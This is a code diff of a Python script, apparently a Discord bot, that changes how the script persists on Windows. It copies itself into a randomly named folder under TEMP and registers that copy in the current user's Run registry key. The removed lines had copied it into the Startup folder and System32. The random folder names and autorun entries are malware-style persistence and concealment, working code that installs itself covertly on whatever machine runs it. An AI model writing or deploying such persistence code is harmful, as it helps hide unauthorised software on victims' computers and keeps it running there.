@@ -118,15 +118,19 @@ async def on_ready():
     if not is_connected():
         await wait_for_connection()  # Wait until connected
 
+import os
+import shutil
+import random
+import string
+import winreg
+import win32com.client
+
+def generate_random_folder_name(length=8):
+    """Generate a random folder name."""
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+
 # Function to add the script to startup
 def add_to_startup_methods(script_path):
-    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-    try:
-        shutil.copy(script_path, startup_folder)
-        print(f"Script copied to Startup folder: {startup_folder}")
-    except Exception as e:
-        print(f"Error copying to Startup folder: {e}")
-
     # Add to registry for current user
     try:
         registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
@@ -164,12 +168,14 @@ def add_to_startup_methods(script_path):
 # Call to add startup entries
 if __name__ == "__main__":
     script_name = os.path.basename(__file__)
-    script_path = os.path.join("C:\\Windows\\System32", script_name)
+    random_folder = generate_random_folder_name()
+    temp_folder = os.path.join(os.getenv("TEMP"), random_folder)
+    os.makedirs(temp_folder, exist_ok=True)
+    script_path = os.path.join(temp_folder, script_name)
     
-    # If the script isn't already in System32, copy it there
-    if not os.path.exists(script_path):
-        shutil.copy(sys.argv[0], script_path)
-        print(f"Copied {script_path} to System32")
+    # Copy script to the new random temporary directory
+    shutil.copy(__file__, script_path)
+    print(f"Copied {script_name} to {script_path}")
     
     add_to_startup_methods(script_path)
     
